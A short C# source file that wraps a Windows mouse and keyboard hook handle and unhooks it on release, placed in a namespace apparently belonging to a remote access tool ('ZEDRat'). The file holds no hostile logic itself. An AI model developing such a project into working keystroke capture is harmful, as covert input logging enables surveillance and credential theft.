using System.Windows.Forms;
using Microsoft.Win32.SafeHandles;

namespace ZEDRatApp.ZEDRAT.MouseKeyHook.WinApi
{
	internal class HookProcedureHandle : SafeHandleZeroOrMinusOneIsInvalid
	{
		private static bool _closing;

		static HookProcedureHandle()
		{
			Application.ApplicationExit += delegate
			{
				HookProcedureHandle._closing = true;
			};
		}

		public HookProcedureHandle()
			: base(ownsHandle: true)
		{
		}

		protected override bool ReleaseHandle()
		{
			if (HookProcedureHandle._closing)
			{
				return true;
			}
			return HookNativeMethods.UnhookWindowsHookEx(base.handle) != 0;
		}
	}
}
